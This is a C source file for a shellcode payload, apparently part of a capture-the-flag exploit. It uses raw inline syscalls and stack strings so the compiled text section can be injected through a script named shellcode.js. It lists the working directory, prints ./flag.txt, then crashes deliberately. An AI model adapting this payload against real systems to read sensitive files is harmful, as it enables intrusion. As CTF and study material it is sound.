// Compile with gcc -O3 -nostdlib -o payload payload.c

// Lists everything in pwd and then prints the contents of ./flag.txt
// NOTE: Use stack strings since we only copy the text section in shellcode.js
//       and use syscalls directly to have inline syscall instructions without using libc

// NOTE2: We use static to have internal linkage in the utility functions so they can get inlined and removed without LTO

#include <dirent.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <asm/unistd.h>

static ssize_t sys_openat(int a, char *b, int c)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_openat), "D"(a), "S"(b), "d"(c)
        : "rcx", "r11", "memory");
    return ret;
}
static ssize_t sys_open(char *a, int b)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_open), "D"(a), "S"(b), "d"(0)
        : "rcx", "r11", "memory");
    return ret;
}
static ssize_t sys_getdents(int a, char *b, int c)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_getdents), "D"(a), "S"(b), "d"(c)
        : "rcx", "r11", "memory");
    return ret;
}
static ssize_t sys_close(int a)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_close), "D"(a)
        : "rcx", "r11", "memory");
    return ret;
}
static ssize_t sys_write(int fd, char *b, int len)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_write), "D"(fd), "S"(b), "d"(len)
        : "rcx", "r11", "memory");
    return ret;
}
static ssize_t sys_read(int fd, char *b, int len)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_read), "D"(fd), "S"(b), "d"(len)
        : "rcx", "r11", "memory");
    return ret;
}
static ssize_t sys_exit(int code)
{
    ssize_t ret;
    asm volatile(
        "syscall"
        : "=a"(ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_exit), "D"(code), "S"(0), "d"(0)
        : "rcx", "r11", "memory");
    return ret;
}
static int strle(char *x)
{
    int y = 0;
    while (*x++)
    {
        y++;
    }
    return y;
}

struct linux_dirent
{
    unsigned long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
};
int _start()
{
    char pathbuf[] = ".";
    char comabuf[] = ", ";
    int h = sys_openat(AT_FDCWD, pathbuf, O_RDONLY | O_NONBLOCK | O_DIRECTORY | O_CLOEXEC);
    char buf[1024];
    long a;
    // Based on code from getdents manpage
    while (a = sys_getdents(h, buf, 1024))
    {
        for (long bpos = 0; bpos < a;)
        {
            struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);
            sys_write(1, d->d_name, strle(d->d_name));
            sys_write(1, comabuf, strle(comabuf));
            bpos += d->d_reclen;
        }
    }
    sys_close(h);

    char flagpathbuf[] = "./flag.txt";
    h = sys_open(flagpathbuf, O_RDONLY);
    char flagreadbuf[1024 * 5];
    sys_read(h, flagreadbuf, 1024 * 5);
    sys_write(1, flagreadbuf, strle(flagreadbuf));
    sys_close(h);

    // Just exit didn't seem to work on the server, a segfault works fine
    volatile char *p = 0;
    *p = 0xFF;
    sys_exit(0);
}